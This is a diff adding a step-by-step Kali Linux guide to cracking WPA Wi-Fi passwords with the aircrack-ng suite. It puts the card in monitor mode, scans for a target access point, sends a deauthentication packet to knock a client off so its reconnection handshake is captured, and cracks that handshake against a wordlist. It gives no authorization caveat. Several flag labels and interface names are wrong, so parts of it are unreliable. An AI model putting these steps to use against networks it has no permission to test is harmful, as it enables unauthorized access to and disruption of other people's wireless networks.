@@ -1,0 +1,62 @@
+WiFi Auditing on Kali Linux using Aircrack -
+
+
+Check WiFi Adapter’s Supported Interface Modes -
+
+Open Terminal >
+
+iw list   (locate "Supported interface modes:", look for "* monitor")
+exit
+
+
+Put WiFi Device Into Montior Mode & Scan For Access Points -
+
+Open Terminal >
+
+airmon-ng check 
+airmon-ng check kill
+airmon-ng start wlan0mon    (<--replace ‘wlan0’ with your WiFi device)
+
+(1st checks for conflicting processes, 2nd kills conflicting processes, 3rd starts monitor mode)
+
+airodump-ng wlan0   (replace 'wlan0' with your wifi device)
+
+
+Locate the BSSID and CH# of your target access point >
+
+Ctrl + C    (end airodump & go back)
+
+
+Start Handshake Capture -
+
+airodump-ng --bssid 00:00:00:00:00 -c 00 -w abc wlan0
+(-w = YourBSSID#, -c = YourCH#, -w = TempFileName)
+
+Wait For a Client To Connect With The WiFi P/W -or-
+Kick A Device To Capture The Re-Connection Handshake)
+
+Locate a MAC Address of a device to Kick >
+(MAC address displayed as "STATION")
+
+Open New Terminal >
+
+aireplay-ng -0 1 --ignore-negative-one -a 00:00:00:00:00 -c 11:11:11:11:11 wlan0
+(-a = BSSID), -c = MAC)
+
+(Watch first terminal (airodump) for "WPA handshake: 00:00:00:00:00" to be displayed across the top of terminal, 
+next to 'fixed channel wlan0') 
+
+Ctrl + C    (end aireplay & go back)
+
+
+Crack the Captured File (.cap) >
+
+aircrack-ng -w wordlist.txt --bssid 00:00:00:00:00 abc-01.cap
+(assuming your terminal is open in the same dir as wordlist & .cap)
+
+(Aircrack will try all passwords in wordlist.txt until it finds the correct one)
+
+Password will be displayed in terminal.
+
+
+DONE!
